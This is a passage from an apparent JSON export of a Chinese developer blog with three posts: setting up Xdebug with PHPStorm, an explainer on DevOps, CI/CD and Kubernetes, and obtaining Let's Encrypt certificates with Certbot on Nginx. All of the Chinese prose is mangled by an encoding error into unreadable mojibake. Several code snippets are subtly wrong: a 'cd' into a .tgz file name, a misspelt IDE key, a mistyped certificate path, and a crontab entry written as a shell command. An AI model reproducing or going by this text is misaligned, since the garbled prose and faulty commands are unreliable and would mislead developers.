¾¿æœ‰äº†è¿™ç¯‡å…³äºPHPSTORMè°ƒè¯•çš„ç¬”è®°ã€‚ åœ¨è¿›è¡Œè°ƒè¯•ä¹‹å‰ï¼Œé¦–å…ˆè¦åšçš„æ˜¯ä¸‹è½½å¹¶å®‰è£…Xdebugï¼Œç„¶åæ‰èƒ½åšç›¸åº”çš„é…ç½®ã€‚ ä¸‹è½½Xdebugï¼ˆWindowsï¼‰ xdebugå®˜ç½‘ å¦‚ä½•é€‰æ‹©ç¬¦åˆè‡ªå·±PHPçš„ç‰ˆæœ¬çš„Xdebugï¼Œå¯ä»¥é€šè¿‡ä¸‹é¢è¿™ç§æ–¹æ³•æ¥åˆ¤æ–­ã€‚ ä½¿ç”¨Xdubugå®˜æ–¹æä¾›çš„ä¸€ä¸ªæ£€æµ‹å·¥å…· åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥ï¼š 12345678# Mac$ php -i | pbcopy# Linux$ php -i | xsel # Windows$ php -i | clip å°†è¾“å‡ºçš„phpinfoä¿¡æ¯å¡«å…¥ï¼Œç„¶åå°±ä¼šè‡ªåŠ¨æ£€æµ‹è¯¥ç‰ˆæœ¬çš„PHP æ‰€å¯¹åº”çš„Xdebugï¼Œå¦‚ä¸‹å›¾ï¼ˆè¿™é‡Œä»¥Windows ä¸ºä¾‹ï¼‰ï¼š ç‚¹å‡»ä¸‹è½½ç›¸åº”çš„æ–‡ä»¶ã€‚ å®‰è£…å¹¶é…ç½®Xdebug å°†ä¸‹è½½å¥½çš„æ–‡ä»¶æ”¾è¿›æŒ‡å®šç›®å½• ..\\php\\ext\\ é…ç½®php.iniæ–‡ä»¶ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼šè¦æ‰¾åˆ°æ­£ç¡®çš„php.iniæ–‡ä»¶ã€‚å¦‚æœä½ ä¸ç¡®å®šæ˜¯å“ªä¸€ä¸ªï¼Œå¯ä»¥å‚è€ƒä¸‹é¢è¿™ä¸ªæ–¹æ³•ï¼š æ‰“å°å‡ºphpinfo()ï¼Œæ‰¾åˆ°å­—æ®µLoaded Configuration Fileæ ¹æ®åé¢çš„è·¯å¾„å»æ‰¾å°±æ²¡é”™äº†ã€‚ æ‰“å¼€æ‰¾åˆ°çš„php.inié…ç½®æ–‡ä»¶ï¼Œåœ¨æœ€åé¢åŠ ä¸Šä»¥ä¸‹ä»£ç ï¼š 12345678# Windows[XDebug]zend_extension &#x3D; &quot;C:\\xampp\\php\\ext\\php_xdebug-2.6.1-7.2-vc15.dll&quot; #è¿™ä¸ªåœ°å€æŒ‡å‘ xdebugæ‰€åœ¨çš„æ–‡ä»¶è·¯å¾„xdebug.profiler_enable &#x3D; 1xdebug.remote_enable &#x3D; 1xdebug.remote_port&#x3D;9001xdebug.idekey&#x3D;PHPSTROMxdebug.remote_host &#x3D; localhost å…¶ä¸­ï¼š xdebug.remote.hostå¦‚æœæ˜¯æœ¬åœ°è°ƒè¯•ï¼Œå¡«localhostå°±å¥½ã€‚ xdebug.remote_portä¸ºè°ƒè¯•æ‰€ç›‘å¬çš„ç«¯å£ï¼Œé€šå¸¸é»˜è®¤ä½¿ç”¨ 9001 ï¼Œéœ€è¦å’ŒPHPStorm ä¸­çš„ Debug port ç›¸åŒã€‚ ä¸‹è½½å¹¶å®‰è£…Xdebugï¼ˆMacï¼‰Mac ä¸‹å®‰è£…Xdebugï¼Œæœ‰ä¸¤ç§æ–¹å¼ï¼š ä½¿ç”¨peclå‘½ä»¤ é€šè¿‡æºç ç¼–è¯‘ ä½¿ç”¨ pecl Pecl æ˜¯ PHP çš„åŒ…ç®¡ç†å™¨ã€‚ è¿™é‡Œä»¥PHP5.6ä¸ºä¾‹ï¼Œéœ€è¦å®‰è£…æœ€æ–°2.5.xç‰ˆæœ¬çš„Xdebugï¼Œå› ä¸ºè¿™æ˜¯PHP5.6æä¾›æ”¯æŒçš„æœ€åä¸€ä¸ªç‰ˆæœ¬ã€‚ 1$ pecl install xdebug-2.5.5 æºç ç¼–è¯‘æºç è·å–çš„æ–¹å¼å’Œä¸Šé¢Windows çš„æ–¹å¼æ˜¯ä¸€æ ·çš„ï¼Œå°†è¾“å‡ºçš„phpinfoç²˜è´´è‡³è¾“å…¥æ¡†ï¼Œç„¶åä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„Xdebugã€‚ 123456$ tar -xvzf xdebug-2.9.4.tgz$ cd xdebug-2.9.4.tgz$ phpize$ .&#x2F;configure$ make$ cp modules&#x2F;xdebug.so &#x2F;usr&#x2F;lib&#x2F;php&#x2F;extensions&#x2F;xdebug å¯ç”¨Xdebugæ— è®ºæ˜¯é€šè¿‡å“ªç§æ–¹å¼å®‰è£…ï¼Œåœ¨æ­£å¼ä½¿ç”¨ä¹‹å‰ï¼Œéƒ½éœ€è¦æ‰‹åŠ¨å¯ç”¨è¯¥æ¨¡å—ã€‚ æ‰¾åˆ°å¯¹åº”ç‰ˆæœ¬çš„ php.ini æ–‡ä»¶å¹¶ç¼–è¾‘ï¼Œåœ¨é…ç½®æ–‡ä»¶ä¸­çš„æœ€åéƒ¨åˆ†åŠ ä¸Šä»¥ä¸‹å†…å®¹ï¼š 1234567[XDebug]zend_extension&#x3D;&quot;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;extensions&#x2F;xdebug&#x2F;xdebug.so&quot;xdebug.profiler_enable &#x3D; 1xdebug.remote_enable &#x3D; 1xdebug.remote_port&#x3D;9001xdebug.idekey&#x3D;PHPSTORMxdebug.remote_host &#x3D; localhost é‡å¯PHPå³å¯ã€‚ å¦‚ä½•æ£€æŸ¥Xdebug æ˜¯å¦å¯ç”¨ï¼Ÿ 12$ php -m | grep xdebugxdebug åœ¨PHPStormä¸­é…ç½®XdebugMac File-&gt;Setting-&gt;PHP-&gt;Debugï¼Œç¡®ä¿PHPStorm å·²ç»æ‰¾åˆ°äº†Xdebugã€‚ åœ¨åˆšæ‰çš„é…ç½®æ²¡é”™çš„å‰æä¸‹ï¼Œè¿™é‡Œæ˜¯å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸå®‰è£…äº†Xdebugçš„ã€‚ å¦‚æœæ˜¾ç¤ºæ²¡æœ‰å®‰è£…ï¼Œè¯·æ£€æŸ¥ä¸Šé¢ä¸¤æ­¥æ“ä½œæœ‰æ— é—®é¢˜ã€‚ File-&gt;Setting-&gt;PHP-&gt;Debug Debug port ä¸php.inié…ç½®æ–‡ä»¶ä¸­çš„xdebug.remote_portçš„å¯¹åº”å‚æ•°ä¿æŒä¸€è‡´ã€‚ File-&gt;Setting-&gt;PHP-&gt;Serverï¼Œè¿™ä¸‰ä¸ªå‚æ•°çš„å€¼å’Œphp.iniä¸­çš„ä¿æŒä¸€è‡´ã€‚ é…ç½®åŸŸå è¿™é‡Œæ ¹æ®å®é™…æƒ…å†µé…ç½®ï¼Œæˆ‘æœ¬åœ°ä½¿ç”¨80 ç«¯å£ä½œä¸ºé¡¹ç›®è®¿é—®ç«¯å£ï¼Œæ‰€ä»¥è¿™é‡Œå¡«çš„æ˜¯80ã€‚ é…ç½®è°ƒè¯•å‚æ•° Run-&gt;Web Server Debug Validationï¼Œæ£€æŸ¥æ˜¯å¦é…ç½®æˆåŠŸã€‚ ç¡®ä¿é¡¹ç›®æ–‡ä»¶è·¯å¾„å’Œæœ¬åœ°åŸŸåèƒ½æ­£å¸¸è®¿é—®ï¼Œå¦‚æœä¸€åˆ‡æ­£å¸¸åˆ™èƒ½çœ‹åˆ°è¾“å‡ºã€‚ WindowsWindows ä¸‹çš„PHPStorm é…ç½®å’ŒMac å‡ ä¹å·®ä¸å¤šï¼Œä¿è¯ä¸€ä¸‹å‡ ç‚¹æ˜¯æ­£å¸¸çš„åŸºæœ¬ä¸Šæ²¡å•¥é—®é¢˜ã€‚ ç¡®ä¿PHPStorm å¯ç”¨äº†å¯¹åº”ç‰ˆæœ¬çš„ Xdebugã€‚ PHPStorm çš„è°ƒè¯•ä¿¡æ¯ä¸php.iniæ–‡ä»¶ä¸­ä¿æŒä¸€è‡´ã€‚ é¡¹ç›®æ–‡ä»¶è·¯å¾„å’Œæœ¬åœ°åŸŸåèƒ½æ­£å¸¸è®¿é—®ã€‚ Xdebug è°ƒè¯•ç«¯å£å¹¶éä¸€å®šè¦ç”¨9001ï¼Œåªè¦ä¿æŒphp.iniä¸PHPStorm çš„ä¿æŒä¸€è‡´å°±å¥½äº†ã€‚ åœ¨PHPStormä¸­ä½¿ç”¨Xdebugæœ‰ä¸¤ç§æ–¹å¼ä½¿ç”¨Xdebugï¼š ç›´æ¥åœ¨ç¼–è¾‘å™¨ä¸­å¼€å§‹è°ƒè¯•ã€‚ é€šè¿‡åœ¨è¯·æ±‚åœ°å€ä¸­é™„åŠ xdebug çš„è¯·æ±‚å‚æ•°æ¥è°ƒè¯•ï¼Œè¿™æ‹›é€šå¸¸ç”¨æ¥å¤„ç†ä¸€äº›å‰åç«¯åˆ†ç¦»çš„è”åŠ¨è°ƒè¯•ã€‚ å‚è€ƒé“¾æ¥ PhpStrom Xdebug é…ç½®ä¸ä½¿ç”¨ å¦‚ä½•åœ¨Mac ä¸Šä¸ºä¸åŒç‰ˆæœ¬çš„PHP å¼€å¯Xdebug é…ç½®Xdebug-å®˜æ–¹æ•™ç¨‹ Xdebug å®˜ç½‘ Xdebug æ£€æµ‹å·¥å…·","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Xdebug","slug":"Xdebug","permalink":"https://www.0x2beace.com/tags/Xdebug/"}]},{"title":"ä»€ä¹ˆæ˜¯DevOpsã€CIã€CDã€K8S","slug":"what-is-devops-ci-cd-k8s","date":"2020-09-12T14:40:00.000Z","updated":"2020-09-14T01:44:10.169Z","comments":true,"path":"what-is-devops-ci-cd-k8s/","link":"","permalink":"https://www.0x2beace.com/what-is-devops-ci-cd-k8s/","excerpt":"ä¹‹æ‰€ä»¥è¦å†™è¿™ç‰‡ç¬”è®°ï¼Œæ˜¯å› ä¸ºå‰æ®µæ—¶é—´åœ¨ä½¿ç”¨ gitlab æäº¤ä»£ç æ—¶ï¼Œé‡åˆ°äº†ç‚¹é—®é¢˜ã€‚ gitlab æç¤ºæˆ‘ commit å¤±è´¥ã€‚è·Ÿè¿›äº†ä¸€ä¸‹ï¼Œå¹¶æ²¡æœ‰æ‰¾åˆ°ç­”æ¡ˆã€‚","text":"ä¹‹æ‰€ä»¥è¦å†™è¿™ç‰‡ç¬”è®°ï¼Œæ˜¯å› ä¸ºå‰æ®µæ—¶é—´åœ¨ä½¿ç”¨ gitlab æäº¤ä»£ç æ—¶ï¼Œé‡åˆ°äº†ç‚¹é—®é¢˜ã€‚ gitlab æç¤ºæˆ‘ commit å¤±è´¥ã€‚è·Ÿè¿›äº†ä¸€ä¸‹ï¼Œå¹¶æ²¡æœ‰æ‰¾åˆ°ç­”æ¡ˆã€‚ åªæ˜¯äº†è§£åˆ°ä¸€ä¸ªå«åš CI/CDçš„ä¸œè¥¿ã€‚åæ¥åˆå»¶ä¼¸æ‰©å±•åˆ°DevOpsã€K8S è¿™äº›æ–°æ¦‚å¿µã€‚ ä»€ä¹ˆæ˜¯ DevOpsï¼Ÿå¦‚é¢˜ï¼Œä»€ä¹ˆæ˜¯ DevOps ï¼Ÿæ ¹æ®å­—é¢æ„æ€ç†è§£å°±æ˜¯ï¼šDev + Opsï¼Œå¼€å‘ï¼ˆDevelopmentï¼‰å’Œè¿è¥ï¼ˆOperationsï¼‰è¿™ä¸¤ä¸ªé¢†åŸŸçš„åˆå¹¶ã€‚ å°±æˆ‘ä¸ªäººçš„ç†è§£ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ¦‚å¿µã€ä¸€ç§æ€ç»´ï¼Œæ˜¯ä¸€ç§é€šåŠ›åˆä½œï¼Œå…±åŒè§£å†³é—®é¢˜çš„æ–¹å¼ã€‚ è¿™é‡Œæˆ‘å°±ä¸è¿½æ ¹æº¯æºå»è§£é‡Šä¸ºä»€ä¹ˆè¦åˆå¹¶å¼€å‘å’Œè¿è¥äº†ï¼Œå› ä¸ºå†å²åŸå› ï¼Œæ€»æ˜¯å­˜åœ¨ç€è¿™æ ·çš„é—®é¢˜ã€‚å…·ä½“çœ‹å‚è€ƒé“¾æ¥ä¸€ã€‚ DevOps ä¹Ÿä¸ä»…ä»…æ˜¯ä¸€ç§è½¯ä»¶çš„éƒ¨ç½²æ–¹æ³•ã€‚å®ƒé€šè¿‡ä¸€ç§å…¨æ–°çš„æ–¹å¼ï¼Œæ¥æ€è€ƒå¦‚ä½•è®©è½¯ä»¶çš„ä½œè€…ï¼ˆå¼€å‘éƒ¨é—¨ï¼‰å’Œè¿è¥è€…ï¼ˆè¿è¥éƒ¨é—¨ï¼‰è¿›è¡Œåˆä½œä¸ååŒã€‚ä½¿ç”¨äº†DevOpsæ¨¡å‹ä¹‹åï¼Œä¼šä½¿ä¸¤ä¸ªéƒ¨é—¨æ›´å¥½çš„äº¤äº’ã€‚å…¶ä¸­ï¼Œè‡ªåŠ¨åŒ–éƒ¨ç½²çš„æ¦‚å¿µå°±æ˜¯ä»ä¸­äº§ç”Ÿçš„ã€‚ ä»€ä¹ˆæ˜¯ CI/CDï¼ŸGitlab çš„CI/CDåˆ°åº•æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ æ˜¨å¤©å¤§è‡´äº†è§£äº†ä¸‹ Gitlab CI/CDï¼Œä¸æ˜¯å¾ˆæ˜ç™½ï¼Œä½†è§‰å¾—å¾ˆå‰å®³ã€‚é¦–å…ˆæ¥çœ‹ä¸‹å®˜æ–¹æ–‡æ¡£çš„ç®€ä»‹ï¼š è½¯ä»¶å¼€å‘çš„è¿ç»­æ–¹æ³•åŸºäºè‡ªåŠ¨æ‰§è¡Œè„šæœ¬ï¼Œä»¥æœ€å¤§é™åº¦åœ°å‡å°‘åœ¨å¼€å‘åº”ç”¨ç¨‹åºæ—¶å¼•å…¥é”™è¯¯çš„å¯èƒ½æ€§ã€‚ä»æ–°ä»£ç çš„å¼€å‘åˆ°éƒ¨ç½²ï¼Œå®ƒä»¬éœ€è¦è¾ƒå°‘çš„äººä¸ºå¹²é¢„ç”šè‡³æ ¹æœ¬ä¸éœ€è¦å¹²é¢„ã€‚å®ƒæ¶‰åŠåœ¨æ¯æ¬¡å°è¿­ä»£ä¸­ä¸æ–­æ„å»ºï¼Œæµ‹è¯•å’Œéƒ¨ç½²ä»£ç æ›´æ”¹ï¼Œä»è€Œå‡å°‘åŸºäºæœ‰ç¼ºé™·æˆ–å¤±è´¥çš„å…ˆå‰ç‰ˆæœ¬å¼€å‘æ–°ä»£ç çš„æœºä¼šã€‚ è¿™é‡Œæœ‰ä¸‰ç§ä¸»è¦çš„æ–¹æ³•ï¼Œæ ¹æ®æœ€é€‚åˆä½ çš„ç­–ç•¥è¿›è¡Œé€‰æ‹©ã€‚ æŒç»­é›†æˆè€ƒè™‘ä¸€ä¸ªåº”ç”¨ç¨‹åºï¼Œå…¶ä»£ç å­˜å‚¨åœ¨Gitlabä¸­çš„å­˜å‚¨åº“ä¸­ã€‚å¼€å‘äººå‘˜æ¯å¤©å¤šæ¬¡æ¨é€ä»£ç æ›´æ”¹ï¼Œå¯¹äºæ¯æ¬¡æ¨åŠ¨åˆ°å­˜å‚¨åº“ï¼Œéƒ½å¯ä»¥åˆ›å»ºä¸€ç»„è„šæœ¬æ¥è‡ªåŠ¨æ„å»ºå’Œæµ‹è¯•åº”ç”¨ç¨‹åºï¼Œä»è€Œå‡å°‘å‘åº”ç”¨ç¨‹åºå¼•å…¥é”™è¯¯çš„å¯èƒ½æ€§ã€‚è¿™ç§æ–¹æ³•è¢«ç§°ä¸ºï¼šæŒç»­é›†æˆï¼ˆContinuous Integrationï¼‰ æŒç»­äº¤ä»˜æŒç»­äº¤ä»˜ Continuous Deliveryæ˜¯æŒç»­é›†æˆçš„ä¸€ä¸ªæ­¥éª¤ï¼Œåº”ç”¨ç¨‹åºä¸ä»…åœ¨æ¨é€åˆ°ä»£ç åº“çš„æ¯ä¸ªä»£ç æ›´æ”¹æ—¶éƒ½æ„å»ºå’Œæµ‹è¯•ï¼Œè€Œä¸”ä½œä¸ºä¸€ä¸ªé¢å¤–çš„æ­¥éª¤ï¼Œå®ƒä¹Ÿä¼šè¿ç»­éƒ¨ç½²ï¼Œå°½ç®¡éƒ¨ç½²æ˜¯æ‰‹åŠ¨è§¦å‘çš„ã€‚ æŒç»­éƒ¨ç½²æŒç»­éƒ¨ç½² Continuous Deploymentä¹Ÿæ˜¯æŒç»­é›†æˆçš„åˆä¸€æ­¥ï¼Œç±»ä¼¼äºæŒç»­äº¤ä»˜ã€‚ä¸åŒä¹‹å¤„åœ¨äºï¼Œä¸å¿…æ‰‹åŠ¨éƒ¨ç½²åº”ç”¨ç¨‹åºï¼Œè€Œæ˜¯å°†å…¶è®¾ç½®ä¸ºè‡ªåŠ¨éƒ¨ç½²ã€‚å®Œå…¨ä¸éœ€è¦äººå·¥å¹²é¢„å°±å¯ä»¥éƒ¨ç½²åº”ç”¨ç¨‹åºã€‚ ä»€ä¹ˆæ˜¯ K8Sï¼Ÿå‚è€ƒé“¾æ¥ ä»€ä¹ˆæ˜¯DevOpsï¼Ÿâ€“ç¨‹åºå‘˜å°ç° DevOps åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿ ä½¿ç”¨GitLabä»‹ç»CI / CD Gitlab CI/CD å¿«é€Ÿå…¥é—¨ Gitlab CI/CD å…¥é—¨ Gitlab CI ç¤ºä¾‹ Docker é›†æˆ Git Runner æ˜¯ä»€ä¹ˆï¼Ÿ å®‰è£…Gitlab Runner ä»€ä¹ˆæ˜¯ Auto DevOps K8S æ˜¯ä»€ä¹ˆï¼ŸçŸ¥ä¹ ä¸ºä»€ä¹ˆ K8S å¾ˆé…· K8S ä¸­æ–‡æŒ‡å— ä¸€æ–‡äº†è§£ K8S æ˜¯ä»€ä¹ˆï¼Ÿ","categories":[{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/categories/Docker/"}],"tags":[{"name":"DevOps","slug":"DevOps","permalink":"https://www.0x2beace.com/tags/DevOps/"},{"name":"K8S","slug":"K8S","permalink":"https://www.0x2beace.com/tags/K8S/"}]},{"title":"å¦‚ä½•è‡ªåŠ¨ç”³è¯·å…è´¹çš„SSL è¯ä¹¦","slug":"how-to-automatically-apply-for-a-free-ssl-certificate","date":"2020-09-11T08:18:20.000Z","updated":"2020-12-21T13:39:01.225Z","comments":true,"path":"how-to-automatically-apply-for-a-free-ssl-certificate/","link":"","permalink":"https://www.0x2beace.com/how-to-automatically-apply-for-a-free-ssl-certificate/","excerpt":"ä¸Šæ¬¡ä»‹ç»äº†å¦‚ä½•é€šè¿‡ç¬¬ä¸‰æ–¹ç½‘ç«™ç”³è¯·å…è´¹çš„SSL è¯ä¹¦ï¼Œä½†æœ‰æ•ˆæœŸåªæœ‰ä¸‰ä¸ªæœˆï¼Œä¸‰ä¸ªæœˆä¹‹ååˆéœ€è¦å†æ¬¡ç”³è¯·ï¼Œè®°å¾—è¿˜å¥½ï¼Œå¦‚æœå¿˜äº†å¯èƒ½è¿˜ä¼šé€ æˆä¸å¿…è¦çš„æŸå¤±ã€‚","text":"ä¸Šæ¬¡ä»‹ç»äº†å¦‚ä½•é€šè¿‡ç¬¬ä¸‰æ–¹ç½‘ç«™ç”³è¯·å…è´¹çš„SSL è¯ä¹¦ï¼Œä½†æœ‰æ•ˆæœŸåªæœ‰ä¸‰ä¸ªæœˆï¼Œä¸‰ä¸ªæœˆä¹‹ååˆéœ€è¦å†æ¬¡ç”³è¯·ï¼Œè®°å¾—è¿˜å¥½ï¼Œå¦‚æœå¿˜äº†å¯èƒ½è¿˜ä¼šé€ æˆä¸å¿…è¦çš„æŸå¤±ã€‚ Letâ€™s Encrypt æ˜¯ä¸€ä¸ªå…è´¹æä¾›çš„SSL è¯ä¹¦çš„CAï¼Œè™½ç„¶æ¯æ¬¡ç­¾å‘çš„æœ‰æ•ˆæœŸéƒ½åªæœ‰ä¸‰ä¸ªæœˆï¼Œä½†æ˜¯å‘è¯æ˜¯è‡ªåŠ¨åŒ–çš„ï¼Œå‘è¯é€Ÿåº¦è¾ƒå¿«ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡è„šæœ¬æ¥è‡ªåŠ¨ç»­ç­¾ï¼Œä¸ºä¸ªäººç½‘ç«™ä½¿ç”¨HTTPSæä¾›äº†ä¸€ä¸ªä¸é”™çš„é€‰æ‹©ã€‚ Letâ€™s Encrypt ï¼ˆä»¥ä¸‹ç®€ç§°LEï¼‰çš„è¯ä¹¦ç­¾å‘ä¸»è¦ä½¿ç”¨åŸºäº ACMEåè®® çš„è¯ä¹¦è‡ªåŠ¨ç®¡ç†å®¢æˆ·ç«¯æ¥å®ç°ã€‚ LEå®˜æ–¹æ¨èçš„å®¢æˆ·ç«¯æ˜¯ Certbot ï¼Œæœ¬æ–‡ä¸­å°±æ˜¯ä½¿ç”¨ Certbot æ¥è·å–å’Œç»­ç­¾è¯ä¹¦ã€‚ LE æ˜¯å¦‚ä½•è‡ªåŠ¨ç­¾å‘è¯ä¹¦çš„å‡è®¾ç°åœ¨è¦ç”³è¯·CA è¯ä¹¦çš„åŸŸåæ˜¯ example.comã€‚ é¦–å…ˆç”±WebServerï¼ˆä¹Ÿå°±æ˜¯æˆ‘ä»¬ç”¨æˆ·ç«¯çš„æœåŠ¡å™¨ï¼‰çš„ç®¡ç†å®¢æˆ·ç«¯ï¼ˆå¦‚Certbotï¼‰å‘é€è¯·æ±‚åˆ°LEï¼Œè®©LEæ¥éªŒè¯å®¢æˆ·ç«¯æ˜¯å¦çœŸçš„æ§åˆ¶example.comè¿™ä¸ªåŸŸåï¼Œæ¥ä¸‹æ¥LEä¼šæå‡ºä¸€äº›éªŒè¯åŠ¨ä½œï¼ˆåŸæ–‡challengesï¼‰ï¼Œæ¯”å¦‚è®©å®¢æˆ·ç«¯åœ¨ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„è·¯å¾„ä¸Šæ”¾æŒ‡å®šçš„æ–‡ä»¶ã€‚åŒæ—¶ï¼ŒLEè¿˜ä¼šå‘å‡ºä¸€ä¸ªéšæœºæ•°ï¼Œå®¢æˆ·ç«¯éœ€è¦ç”¨è¿™ä¸ªéšæœºæ•°å’Œå®¢æˆ·ç«¯è‡ªå·±çš„ç§é’¥æ¥è¿›è¡Œç­¾åã€‚ WebServerä¸Šçš„å®¢æˆ·ç«¯å®ŒæˆLEæŒ‡å®šçš„åŸŸåéªŒè¯åŠ¨ä½œå¹¶ä¸”å°†åŠ å¯†åçš„ç­¾ååï¼Œå†æ¬¡å‘é€è¯·æ±‚åˆ°LEè¦æ±‚éªŒè¯ï¼ŒLEä¼šéªŒè¯å‘å›æ¥çš„ç­¾åæ˜¯å¦æ­£ç¡®ï¼Œå¹¶ä¸”éªŒè¯åŸŸåéªŒè¯åŠ¨ä½œæ˜¯å¦å®Œæˆï¼Œå¦‚ä¸‹è½½æŒ‡å®šçš„æ–‡ä»¶å¹¶ä¸”åˆ¤æ–­æ–‡ä»¶é‡Œé¢çš„å†…å®¹æ˜¯å¦ç¬¦åˆè¦æ±‚ã€‚ è¿™äº›éªŒè¯éƒ½å®Œæˆä»¥åï¼Œå¯ä»¥ç”³è¯·è¯ä¹¦äº†ã€‚ å®ŒæˆéªŒè¯åï¼Œå®¢æˆ·ç«¯ç”Ÿæˆè‡ªå·±çš„ç§é’¥ä»¥åŠ Certificate Signing Requestï¼ˆCSRï¼‰ å‘é€åˆ°LEæœåŠ¡å™¨ï¼ŒLEæœåŠ¡å™¨ä¼šå°†CAè¯ä¹¦ï¼ˆä¹Ÿæ˜¯å…¬é’¥ï¼‰å‘æ”¾åˆ°ä½ çš„æœåŠ¡å™¨ã€‚ è¿™æ ·å°±å®Œæˆäº†CAè¯ä¹¦çš„è‡ªåŠ¨åŒ–å‘æ”¾äº†ã€‚ ä½¿ç”¨Certbot è·å–è¯ä¹¦LE çš„CA è¯ä¹¦å‘æ”¾åŸç†çœ‹ç€è¿˜æŒºéº»çƒ¦çš„ï¼Œä½†å¦‚æœä½¿ç”¨ Certbot å®¢æˆ·ç«¯ï¼Œæ•´ä¸ªè¿‡ç¨‹è¿˜æ˜¯æŒºç®€å•çš„ã€‚ åœ¨æ­£å¼è·å–è¯ä¹¦ä¹‹å‰ï¼Œæ¨èå…ˆå»Certbot å®˜ç½‘é€‰æ‹©é€‚åˆè‡ªå·±çš„ç³»ç»Ÿç¯å¢ƒã€‚ æˆ‘è¿™è¾¹ç³»ç»Ÿç¯å¢ƒæ˜¯Nginx + Ubuntu 18.04 LTSï¼Œæ‰€ä»¥ä¸‹é¢ä»‹ç»çš„å®‰è£…æµç¨‹åªé€‚ç”¨äºUbuntu + Nginxã€‚ 1. å®‰è£… snapsnap æ˜¯Canonicalå…¬å¸å‘å¸ƒçš„å…¨æ–°çš„è½¯ä»¶åŒ…ç®¡ç†æ–¹å¼ï¼Œå®ƒç±»ä¼¼ä¸€ä¸ªå®¹å™¨æ‹¥æœ‰ä¸€ä¸ªåº”ç”¨ç¨‹åºæ‰€æœ‰çš„æ–‡ä»¶å’Œåº“ï¼Œå„ä¸ªåº”ç”¨ç¨‹åºä¹‹é—´å®Œå…¨ç‹¬ç«‹ã€‚ä½¿ç”¨snap åŒ…çš„å¥½å¤„å°±æ˜¯å®ƒè§£å†³äº†åº”ç”¨ç¨‹åºä¹‹é—´çš„ä¾èµ–é—®é¢˜ï¼Œä½¿åº”ç”¨ç¨‹åºä¹‹é—´æ›´å®¹æ˜“ç®¡ç†ã€‚ä½†æ˜¯ç”±æ­¤å¸¦æ¥çš„é—®é¢˜å°±æ˜¯å®ƒå ç”¨æ›´å¤šçš„ç£ç›˜ç©ºé—´ã€‚ 12$ sudo apt update$ sudo apt install snapd 2. å®‰è£… certbotåœ¨å®‰è£… Certbot ä¹‹å‰ï¼Œæœ€å¥½å…ˆç§»é™¤å†å²å¿«ç…§ã€‚ 1$ sudo apt-get remove certbot è¿›è¡Œå®‰è£…ï¼š 1$ sudo snap install --classic certbot 3. ç”Ÿæˆè¯ä¹¦å®‰è£…å®Œæˆä¹‹åï¼Œä¸‹ä¸€æ­¥éœ€è¦åšçš„å°±æ˜¯ç”Ÿæˆè¯ä¹¦äº†ï¼Œè¿™é‡Œæœ‰ä¸¤ç§æ–¹å¼ï¼š ç”Ÿæˆè¯ä¹¦å¹¶è‡ªåŠ¨é…ç½® 1$ sudo certbot --nginx ç”Ÿæˆè¯ä¹¦æ‰‹åŠ¨é…ç½® 1$ sudo certbot certonly --nginx æˆ‘é€‰æ‹©çš„æ˜¯æ‰‹åŠ¨é…ç½®ï¼Œå¤§æ¦‚æµç¨‹å¦‚ä¸‹ï¼š è¾“å…¥å¸¸ç”¨é‚®ç®±ï¼Œç”¨æ¥æ¥æ”¶é€šçŸ¥å’Œæ¢å¤å¯†é’¥ã€‚ åŒæ„ä½¿ç”¨åè®®ã€‚ è¾“å…¥éœ€è¦åšæˆæƒçš„åŸŸåï¼Œå¤šä¸ªåŸŸåç”¨ç©ºæ ¼éš”å¼€ã€‚ ç­‰å¾…éªŒè¯é€šè¿‡ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼š certbotä¼šè‡ªåŠ¨æ£€æµ‹æœ¬åœ°Nginx çš„å¯ç”¨åŸŸåï¼ˆæ²¡æœ‰é…ç½®server_name çš„åŸŸåä¸ä¼šè¢«æ£€æµ‹åˆ°ï¼‰ å¦‚æœå…¶ä¸­æŸä¸ªåŸŸåéªŒè¯å¤±è´¥ï¼Œåˆ™ä¸ä¼šç”Ÿæˆå¯†é’¥åŠè¯ä¹¦ ä¸€åˆ‡æ­£å¸¸çš„è¯ï¼Œå¯ä»¥çœ‹åˆ°/etc/letsencrypt/live/your_sites/ç›®å½•ä¸‹å¤šäº†å››ä¸ªæ–‡ä»¶ï¼š cert.pem ï¼š å…¬é’¥ï¼ŒæœåŠ¡å™¨è¯ä¹¦ chain.pem ï¼š ä¸­é—´è¯ä¹¦ fullchain.pem ï¼š å‰ä¸¤ä¸ªçš„åˆé›† privkey.pem ï¼š ç§é’¥ å…¶ä¸­é…ç½®Nginx SSL åªéœ€è¦ç”¨åˆ°fullchain.pem å’Œprivkey.pemï¼š 123456789server &#123; listen 443 ssl; server_name www.example.com; ssl on; ssl_certificate &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;www.exampl.com&#x2F;fullchain.pem; ssl_certificate_key &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;www.example.com&#x2F;privkey.pem; ...&#125; è‡³æ­¤ï¼Œå°±å·²ç»å®Œæˆäº†ç”Ÿæˆè¯ä¹¦åˆ°é…ç½®çš„å…¨éƒ¨è¿‡ç¨‹äº†ã€‚ è‡ªåŠ¨ç»­ç­¾å¦‚æœå¿«è¦åˆ°æœŸäº†ï¼Œå¯ä»¥ä½¿ç”¨certbot renewå¯¹è¯ä¹¦è¿›è¡Œæ›´æ–°ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœè¯ä¹¦å°šæœªè¿‡æœŸï¼Œåˆ™ä¸ä¼šæ›´æ–°ã€‚ å¯ä»¥é…åˆconrtabä½¿ç”¨ï¼Œæ¯åŠä¸ªæœˆçš„å‡Œæ™¨ä¸‰ç‚¹è‡ªåŠ¨ç»­ç­¾ä¸€æ¬¡ã€‚ 1$ 0 3 15 * * certbot renew å‚è€ƒé“¾æ¥ Letâ€™s 